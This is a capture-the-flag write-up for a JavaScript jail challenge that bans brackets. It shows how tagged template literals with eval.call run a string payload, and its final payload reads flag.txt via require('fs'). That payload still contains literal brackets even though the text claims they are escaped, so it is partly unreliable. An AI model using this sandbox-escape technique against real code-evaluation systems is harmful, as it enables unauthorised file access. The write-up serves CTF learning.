# jarvarscriptar

| Author     | **Round**  | **Player 1** | **Player 2** | **Winner** |
| ---------- | ---------- | ------------ | ------------ | ---------- |
| HexF       | Tiebreaker |              |              |            |

<details>
  <summary>(SPOILER) Writeup</summary>

The challenge evaluates a single line of javascript, disallowing the use of brackets.

JavaScript ES6 supports tagged template literals, of the following form, which will call the underlying function as shown.
```js
console.log`my ${template} data is ${cool}` // -> console.log(["my ", " data is ", ""], template, cool)
```

A naive approach would try the following, but will quickly realise `eval` wont cast the array to a string, and instead pass it through
```js
eval`get_flag` // -> eval(["get_flag"]) -> ["get_flag"]
```

We can make use of the template expansion to fix this, using `.call`, which absorbs the first argument as the 'this' object, resulting in
```js
eval.call`a ${payload} was here` // -> eval.call(["a ", " was here"], payload) -> eval(payload)
```

This allows us to evaluate a string, which we obtain brackets within using `\u0027` and `\u0028`.
All together, gives us the final payload:

```js
eval.call`${"require('fs').readFileSync('flag.txt', 'utf8')"}`
// -> eval.call([""], "require('fs').readFileSync('flag.txt', 'utf8')")
// -> eval("require('fs').readFileSync('flag.txt', 'utf8')")
```


</details>
